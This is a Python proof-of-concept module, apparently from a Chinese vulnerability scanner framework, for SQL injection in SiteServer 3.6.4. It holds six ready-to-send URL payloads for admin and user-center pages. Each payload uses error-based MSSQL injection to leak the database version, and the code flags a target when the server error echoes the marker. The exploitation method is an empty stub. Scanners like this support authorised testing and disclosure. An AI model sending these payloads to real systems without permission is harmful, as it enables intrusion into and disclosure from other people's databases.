# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '506a412c-9fde-4184-9ddf-f52cedaaec8d'
    name = 'SiteServer最新版3.6.4 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-02-03'  # 漏洞公布时间
    desc = '''
        SiteServer最新版3.6.4 存在多处SQL注入漏洞：
        /siteserver/service/background_taskLog.aspx
        /usercenter/platform/user.aspx
        /siteserver/bbs/background_keywordsFilting.aspx
        /siteserver/userRole/background_administrator.aspx
        /siteserver/userRole/background_user.aspx
        /siteserver/bbs/background_thread.aspx
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'SiteServer'  # 漏洞应用名称
    product_version = '3.6.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3dca799c-9342-4fec-b405-6c1a6708e10c'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps=[
                '/siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&DateFrom=&DateTo=&IsSuccess=All',
                '/usercenter/platform/user.aspx?UnLock=sdfe%27&UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--',
                '/siteserver/bbs/background_keywordsFilting.aspx?grade=0&categoryid=0&keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271',
                '/siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName',
                '/siteserver/userRole/background_user.aspx?PageNum=0&Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&CreateDate=0&LastActivityDate=0&TypeID=0&DepartmentID=0&AreaID=0',
                '/siteserver/bbs/background_thread.aspx?UserName=test&Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&DateFrom=&DateTo=&ForumID=0',
                ]
            for p in ps:
                url=arg+p
                code,head,res,errcode,_=hh.http(url)
                
                if code==500 and "GAOJIMicrosoft" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()